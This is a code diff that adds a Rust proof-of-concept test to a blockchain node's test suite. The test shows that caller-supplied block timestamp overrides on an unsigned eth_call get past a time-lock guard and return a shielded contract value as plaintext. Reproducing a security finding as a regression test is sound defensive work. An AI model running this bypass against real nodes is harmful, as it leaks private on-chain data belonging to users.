@@ -20,7 +20,7 @@ use alloy_primitives::{
 use alloy_provider::{Provider, SendableTx};
 use alloy_rpc_types::{
     state::{AccountOverride, StateOverride},
-    Block, Header, TransactionInput, TransactionRequest,
+    Block, BlockOverrides, Header, TransactionInput, TransactionRequest,
 };
 use alloy_signer_local::PrivateKeySigner;
 use alloy_sol_types::{sol, SolCall, SolValue};
@@ -1388,5 +1388,100 @@ async fn test_usdc_only_susdc_transfer_e2e() -> eyre::Result<()> {
     .unwrap()
     .unwrap();
     assert!(receipt.status());
+    Ok(())
+}
+
+/// Creation bytecode for `testing/TimeLockedSecret.sol`, compiled with `ssolc`
+/// 0.8.31-develop. The constructor `CSTORE`s 42 into shielded slot 0; `getSecret()`
+/// (selector 0x5b9fdc30) gates a private `CLOAD` behind `block.timestamp >= 0x7fffffffffffffff`.
+const TIME_LOCKED_SECRET_BYTECODE: &[u8] = &hex!("6080604052348015600e575f5ffd5b50602a5fb160e58061001f5f395ff3fe6080604052348015600e575f5ffd5b50600436106026575f3560e01c80635b9fdc3014602a575b5f5ffd5b60306042565b60405190815260200160405180910390f35b5f63ee6b280042101560835760405162461bcd60e51b81526020600482015260066024820152651b1bd8dad95960d21b604482015260640160405180910390fd5b505fb09056fea264697066735822122061afc0791cd8a62d6d55144a83fc6093909edb0fe0559157378238af805c7e5a64736f6c637828302e382e33312d646576656c6f702e323032362e342e32392b636f6d6d69742e63643931363364380059");
+
+/// PoC for the "block overrides bypass private-read guards" finding.
+///
+/// `TimeLockedSecret` keeps `42` in a shielded (`suint`) slot and gates the `CLOAD`
+/// read behind `block.timestamp >= REVEAL_TIME` (far future). Under canonical block
+/// context an unsigned caller cannot reach the read. But by supplying caller-controlled
+/// `blockOverrides.time`, the caller satisfies the guard, reaches the private `CLOAD`,
+/// and the node returns the secret as plaintext on the unsigned `eth_call` path —
+/// exactly the leak the finding describes.
+#[tokio::test(flavor = "multi_thread")]
+async fn test_block_overrides_bypass_private_read_guard() -> eyre::Result<()> {
+    let (mut node, client, chain_id, wallet, _tasks) = setup_test_node().await?;
+
+    // Deploy TimeLockedSecret via a regular (non-seismic) tx; the constructor
+    // CSTOREs 42 into private slot 0.
+    let tx_hash = EthApiOverrideClient::<Block>::send_raw_transaction(
+        &client,
+        get_signed_deploy_tx_bytes(
+            wallet.inner.clone(),
+            get_nonce(&client, wallet.inner.address()).await,
+            chain_id,
+            Bytes::from_static(TIME_LOCKED_SECRET_BYTECODE),
+        )
+        .await
+        .into(),
+    )
+    .await
+    .unwrap();
+    node.advance_block().await?;
+
+    let receipt = EthApiClient::<
+        SeismicTransactionRequest,
+        SeismicTransactionSigned,
+        SeismicBlock,
+        SeismicTransactionReceipt,
+        Header,
+    >::transaction_receipt(&client, tx_hash)
+    .await
+    .unwrap()
+    .unwrap();
+    assert!(receipt.status(), "deploy must succeed");
+    let contract_addr = receipt.contract_address.unwrap();
+
+    // Unsigned, public eth_call to getSecret() (no seismic_elements => `from` is nulled).
+    let get_secret: Bytes = Bytes::from_static(&hex!("5b9fdc30"));
+    let make_request = || {
+        SeismicCallRequest::TransactionRequest(SeismicTransactionRequest {
+            inner: TransactionRequest {
+                to: Some(TxKind::Call(contract_addr)),
+                input: TransactionInput { input: Some(get_secret.clone()), data: None },
+                gas: Some(1_000_000),
+                chain_id: Some(chain_id),
+                ..Default::default()
+            },
+            seismic_elements: None,
+        })
+    };
+
+    // Control: canonical block context. The timestamp guard holds, the private read
+    // is unreachable, and the call reverts with "locked".
+    let control =
+        EthApiOverrideClient::<Block>::call(&client, make_request(), None, None, None).await;
+    assert!(
+        control.is_err(),
+        "without overrides the guard must hold and the call must revert, got Ok: {:?}",
+        control.ok().map(hex::encode)
+    );
+
+    // Exploit: caller-supplied blockOverrides.time satisfies `block.timestamp >= REVEAL_TIME`,
+    // reaching the private CLOAD. The node returns the secret as plaintext.
+    let block_overrides =
+        BlockOverrides { time: Some(0x7fff_ffff_ffff_ffff), ..Default::default() };
+    let output = EthApiOverrideClient::<Block>::call(
+        &client,
+        make_request(),
+        None,
+        None,
+        Some(Box::new(block_overrides)),
+    )
+    .await
+    .expect("block-override call should reach the guarded private read");
+
+    assert_eq!(
+        U256::from_be_slice(&output),
+        U256::from(42),
+        "block override leaked the private CLOAD value as plaintext"
+    );
+
     Ok(())
 }
